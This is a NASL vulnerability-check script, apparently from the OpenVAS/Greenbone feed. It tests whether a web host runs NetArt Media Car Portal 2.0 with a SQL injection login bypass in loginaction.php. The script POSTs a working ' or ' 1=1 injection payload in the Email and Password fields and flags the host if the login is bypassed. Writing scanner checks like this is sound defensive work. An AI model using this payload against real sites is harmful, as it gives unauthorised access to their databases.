if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902475" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-09-23 16:39:49 +0200 (Fri, 23 Sep 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "NetArt Media Car Portal SQL injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://securityreason.com/wlb_show/WLB-2011090081" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/105210/carportal20-sqlbypass.txt" );
	script_tag( name: "insight", value: "The flaw exists due to the error in 'loginaction.php', which
  fails to sufficiently sanitize user-supplied data in 'Email' and 'Password' parameters." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running NetArt Media Car Portal and is prone SQL
  injection vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to bypass the
  security restrictions or view, add, modify back-end database." );
	script_tag( name: "affected", value: "NetArt Media Car Portal Version 2.0." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/autoportal1", "/carportal", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(ContainsString( res, "\">Car Portal<" ) && ContainsString( res, "netartmedia" )){
		filename = dir + "/loginaction.php";
		authVariables = "Email=%27or%27+1%3D1&Password=%27or%27+1%3D1";
		req = NASLString( "POST ", filename, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", http_get_user_agent(), "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( authVariables ), "\\r\\n\\r\\n", authVariables );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, "Location: DEALERS/index.php" )){
			report = http_report_vuln_url( port: port, url: filename );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

